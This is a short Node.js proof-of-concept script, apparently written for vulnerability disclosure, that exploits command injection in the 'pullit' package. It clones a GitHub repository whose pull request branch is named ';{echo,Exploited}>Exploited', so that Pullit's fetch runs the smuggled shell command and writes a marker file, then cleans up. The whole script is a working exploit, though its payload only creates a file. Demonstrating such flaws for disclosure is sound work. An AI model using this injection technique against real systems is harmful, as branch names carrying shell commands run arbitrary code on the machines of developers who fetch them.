const {execSync} = require('child_process');
const Pullit = require('pullit/src');

// This Repo (Created by Me) Contains a Pull Request in a Branch Named ';{echo,Exploited}>Exploited'
execSync('git clone https://github.com/Scofield1337/PullitVuln.git');
process.chdir('PullitVuln');

const p = new Pullit();
p.fetch(1).then(() => {
    // Move File 'Exploited' Created by Pullit to Previous Directory
    execSync('mv Exploited ../');
    process.chdir('../');
    execSync('rm -rf PullitVuln');
});
